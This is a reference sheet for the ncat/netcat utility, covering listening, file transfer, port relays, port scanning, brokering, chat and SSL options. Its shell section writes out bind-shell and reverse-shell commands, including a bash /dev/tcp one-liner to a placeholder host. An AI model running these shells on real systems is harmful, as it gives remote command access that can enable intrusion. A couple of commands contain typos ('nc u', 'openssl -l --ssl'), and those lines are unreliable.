
The `ncat` (`nc`) command is a versatile utility tool for basic TCP or UDP communication.

Note that any function here needing a more advanced switch than `-l` (listen mode) or `-v` (verbose mode) will probably depend on using nmap-ncat. This more feature-heavy expansion on the original `netcat` command is often standard on Linux distributions.

For more information on nmap-ncat: https://nmap.org/ncat/guide/index.html

## Basic Usage

Listen on TCP/3000 (default is TCP/31337):

    nc -l 3000

Listen on UDP/3000:

    nc u -l 3000

Client (to 10.20.30.40 on TCP/4000):

    nc 10.20.30.40 4000

## File Transfer

Transferring a file to a listener:

    nc -l 4000 > file

Transferring a file from the client:

    cat file-contents | nc [address] [port]

Transferring a file from a listener:

    cat file | nc -l 8008

Loading a file from the listener to the client:

    nc -w3 localhost 8008 > file

## Shell

This section describes various flavours of creating an instant remote shell.

### Server Listener (Bind Shell)

In this example, the server that we will be getting a BASH shell for listens on a port. The common term for this seems to be a "Bind Shell".

Insta-shell:

    nc -l 3000 -e /bin/bash

If you wanted to do this on Windows machine with `nc`, you would just need to sub in `/bin/bash` for `cmd.exe`:

    nc -l 3000 -c cmd.exe

The client connects normally:

    nc server-host 3000

### Server as NCat Client

In this example, the server that we will be getting a BASH shell for connects out to a client listening with `nc`.

On the client, prepare a listening `nc` instance (using -v for some good-measure verbosity):

    nc -lv 4000

On the server, connect outwards to the listening client:

    nc client-host 4000 -e /bin/bash

The outward connection can also be done directly with BASH:

    bash -i >& /dev/tcp/client-host/4444 0>&1

## Port Redirect

To relay TCP connections aimed at the listener on port 1234 to 10.11.12.13 on port 4321:

    nc -lk 1234 -c "nc 10.11.12.13 4321"

The same can be done with UDP datagrams using the `-u` switch:

    nc -lku 1234 -c "nc 10.11.12.13 4321"

## Port Scan

`nc` can be used as a stand-in for `nmap` in a pinch.

To scan a range of TCP ports on an IP address:

    nc -v -n  -z -w1 [TargetIPaddr] [start_port]-[end_port]

## Brokering

With the `--broker` switch, `nc` can be used as a go-between for two clients that are not able to directly communicate with each other. To transfer a file:

    nc -l --broker 9999
    nc remote-server 9999 > file-contents
    cat file | nc remote-server 9999 --send-only

The drawback to this seems to be that the server intended to receive the data will need to manually enter an EOF (ctrl-D).

## Chat Server

Building on its brokering feature, `nc` has the ability to act as a basic chat server.

On the server:

    nc -vl 4000 --chat

On clients, connection does not require any special tricks:

    nc server-address 4000

Further notes:

* Although the server can send messages, user messages are not printed.
* Users are assigned names based solely on the file descriptor assigned to their TCP socket.
* The multi-user functionality of `--chat` is only necessary if you are expecting to support more than 2 users. If not, a regular listening session adds much less complexity.

## SSL Encryption

`nc` offers the option to encrypt communications with the `--ssl` switch.

If used directly, a temporary 1024-bit RSA key will be created:

    nc -l --ssl 1234

`nc` clients will connect normally, merely needing to use the `--ssl` switch as well.

### Permanent Certificate and Key

Example to create a static certificate and key pair:

    openssl req -x509 -nodes -days 365 -newkey rsa:1024 -keyout mykey.pem -out mycert.pem

To use these two new files when listening:

    openssl -l --ssl --ssl-cert mycert.pem --ssl-key mykey.pem

### Certificate Verification

The default behavior of `nc` is to automatically trust the certificate that it is connecting to.

To verify the certificate of the server that you are connecting to, use `--ssl-verify`. An easy way to test this is to connect to a website with HTTPS. If the `nc` connection does not immediately fail, then the connection was successful. HTTP servers will generally throw an error back at you if you enter any silly input that is not a valid HTTP request. This is also useful for confirming that `nc` worked as intended.

    nc --ssl --ssl-verify fedoraproject.org 443

If you are using a self-signed certificate, then you may want to instead use your own certificate collection. This can be done using `--ssl-trustfile` to specify a PEM-format list of certificates. Using `--ssl-trustfile` seems to imply `--ssl-verify`.

    nc --ssl --ssl-trustfile mycert.pem remote-address 9999

Unfortunately, it seems like for the moment you cannot have halfway verification (e.g. accepting certificates that are trusted but with a non-matching hostname). This means that you will need to be proper and particular about your hostname when making your certificate and connecting.

## TCP Banner

Some services advertise a banner if you send an empty payload to them. For example:

    nc -v -n -w1 10.11.12.13 22 <<< ""

Against an Ubuntu 16.04 machine, SSH (TCP/22) would output the following:

    Ncat: Version 7.12 ( https://nmap.org/ncat )
    Ncat: Connected to 10.11.12.13:22.
    SSH-2.0-OpenSSH_7.2p2 Ubuntu-4ubuntu1
    Protocol mismatch.
    Ncat: 1 bytes sent, 58 bytes received in 0.05 seconds.

